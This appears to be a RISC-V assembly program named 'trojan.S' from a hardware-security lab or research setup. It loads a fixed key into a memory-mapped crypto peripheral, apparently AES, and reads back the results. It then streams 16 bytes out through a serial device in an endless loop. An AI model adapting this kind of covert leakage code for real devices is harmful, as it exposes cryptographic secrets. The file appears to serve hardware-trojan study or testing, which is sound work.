// build command: /tools/riscv/bin/riscv32-unknown-elf-clang -Xclang -fcolor-diagnostics -pipe -D_FILE_OFFSET_BITS=64 -Wall -Winvalid-pch -Werror -std=c11 -g -nostdinc -Os -fvisibility=hidden --gcc-toolchain=/tools/riscv -march=rv32imc -mabi=ilp32 -mcmodel=medany -ffreestanding -o 'trojan.S.o' -c trojan.S && /tools/riscv/bin/riscv32-unknown-elf-ld -o trojan.elf trojan.S.o && /tools/riscv/bin/riscv32-unknown-elf-objcopy -O binary trojan.elf trojan.bin
//.org 3dc
before_trojan:
  sw    zero, 16(sp)
  sw    zero, 12(sp)
  addi  sp, sp, -32
  // 1000001c
  lui   a0, 0x10000
  addi  a1, a0, 28
  sw    a1, 40(sp)
  // ffeeddcc
  lui   a1, 0xffeee
  addi  a1, a1, -564
  sw    a1, 36(sp)
  // bbaa9988
  lui   a1, 0xbbaaa
  addi  a1, a1, -1656
  sw    a1, 32(sp)
  // 77665544
  lui   a1, 0x77665
  addi  a1, a1, 1348
  sw    a1, 28(sp)
  // 33221100
  lui   a1, 0x33221
  addi  a1, a1, 256
  sw    a1, 24(sp)
  addi  a0, a0, 8
  sw    a0, 20(sp)
  sw    zero,16(sp)
  j     j41a
j41a:
  lw    a0, 16(sp)
  li    a1, 4
  blt   a0, a1, j426
  j     j424
j424:
  j     j4a0
j426:
  lw    a0, 16(sp)
  slli  a0, a0, 0x2
  addi  a1, sp, 24
  add   a1, a1, a0
  lbu   a2, 0(a1)
  ori   a3, a1, 1
  lbu   a3, 0(a3)
  slli  a3, a3, 0x8
  or    a2, a2, a3
  ori   a3, a1, 2
  lbu   a3, 0(a3)
  ori   a1, a1, 3
  lbu   a1, 0(a1)
  slli  a1, a1, 0x8
  or    a1, a1, a3
  slli  a1, a1, 0x10
  or    a1, a1, a2
  lui   a2, 0x40110
  add   a0, a0, a2
  sw    a1, 0(a0)
  lw    a0, 16(sp)
  slli  a0, a0, 0x2
  addi  a1, sp, 44
  add   a1, a1, a0
  lbu   a3, 0(a1)
  ori   a4, a1, 1
  lbu   a4, 0(a4)
  slli  a4, a4, 0x8
  or    a3, a3, a4
  ori   a4, a1, 2
  lbu   a4, 0(a4)
  ori   a1, a1, 3
  lbu   a1, 0(a1)
  slli  a1, a1, 0x8
  or    a1, a1, a4
  slli  a1, a1, 0x10
  or    a1, a1, a3
  // 40110020
  addi  a2, a2, 32
  add   a0, a0, a2
  sw    a1, 0(a0)
  j     j498
j498:
  lw    a0, 16(sp)
  addi  a0, a0, 1
  sw    a0, 16(sp)
  j     j41a
j4a0:
  li    a0, 4
  sw    a0, 12(sp)
  j     j4a6
j4a6:
  lw    a0, 12(sp)
  li    a1, 8
  blt   a0, a1, j4b2
  j     j4b0
j4b0:
  j     j4d8
j4b2:
  lw    a0, 12(sp)
  slli  a0, a0, 0x2
  lui   a1, 0x40110
  add   a0, a0, a1
  sw    zero, 0(a0)
  lw    a0, 12(sp)
  slli  a0, a0, 0x2
  // 40110020
  addi  a1, a1, 32
  add   a0, a0, a1
  sw    zero, 0(a0)
  j     j4d0
j4d0:
  lw    a0, 12(sp)
  addi  a0, a0, 1
  sw    a0, 12(sp)
  j     j4a6
j4d8:
  j     j4da
j4da:
  lui   a0, 0x40110
  lw    a0, 120(a0)
  andi  a0, a0, 8
  bnez  a0, j4e8
  j     j4e6
j4e6:
  j     j4da
j4e8:
  sw    zero, 8(sp)
  j     j4ec
j4ec:
  lw    a0, 8(sp)
  li    a1, 4
  blt   a0, a1, j4f8
  j     j4f6
j4f6:
  j     j53e
j4f8:
  lw    a0, 8(sp)
  slli  a0, a0, 0x2
  addi  a1, sp, 76
  add   a1, a1, a0
  lbu   a2, 0(a1)
  ori   a3, a1, 1
  lbu   a3, 0(a3)
  slli  a3, a3, 0x8
  or    a2, a2, a3
  ori   a3, a1, 2
  lbu   a3, 0(a3)
  ori   a1, a1, 3
  lbu   a1, 0(a1)
  slli  a1, a1, 0x8
  or    a1, a1, a3
  slli  a1, a1, 0x10
  or    a1, a1, a2
  lui   a2, 0x40110
  // 40110050
  addi  a2, a2, 80
  add   a0, a0, a2
  sw    a1, 0(a0)
  j     j536
j536:
  lw    a0, 8(sp)
  addi  a0, a0, 1
  sw    a0, 8(sp)
  j     j4ec
j53e:
  j     j540
j540:
  lui   a0, 0x40110
  lw    a0, 120(a0)
  andi  a0, a0, 4
  bnez  a0, j54e
  j     j54c
j54c:
  j     j540
j54e:
  sw    zero, 4(sp)
  j     j552
j552:
  lw    a0, 4(sp)
  li    a1, 4
  blt   a0, a1, j55e
  j     j55c
j55c:
  j     j582
j55e:
  lw    a0, 4(sp)
  slli  a0, a0, 0x2
  lui   a1, 0x40110
  // 40110060
  addi  a1, a1, 96
  add   a0, a0, a1
  lw    a0, 0(a0)
  lw    a1, 40(sp)
  lw    a2, 4(sp)
  slli  a2, a2, 0x2
  add   a1, a1, a2
  sw    a0, 0(a1)
  j     j57a
j57a:
  lw    a0, 4(sp)
  addi  a0, a0, 1
  sw    a0, 4(sp)
  j     j552
j582:
  sw    zero, 0(sp)
  j     j586
j586:
  lw    a0, 0(sp)
  li    a1, 16
  bltu  a0, a1, j592
  j     j590
j590:
  j     j5ce
j592:
  j     j594
j594:
  lw    a0, 20(sp)
  lw    a0, 0(a0)
  lw    a0, 16(a0)
  andi  a0, a0, 1
  beqz  a0, j5a2
  j     j5a0
j5a0:
  j     j594
j5a2:
  lw    a0, 40(sp)
  lw    a1, 0(sp)
  add   a0, a0, a1
  // 40110000
  lbu   a0, 0(a0)
  lw    a1, 20(sp)
  lw    a1, 0(a1)
  sw    a0, 24(a1)
  j     j5b4
j5b4:
  lw    a0, 20(sp)
  lw    a0, 0(a0)
  lw    a0, 16(a0)
  srli  a0, a0, 0x3
  andi  a0, a0, 1
  bnez  a0, j5c4
  j     j5c2
j5c2:
  j     j5b4
j5c4:
  j     j5c6
j5c6:
  lw    a0, 0(sp)
  addi  a0, a0, 1
  sw    a0, 0(sp)
  j     j586
j5ce:
  addi  sp, sp, 32
  j     before_trojan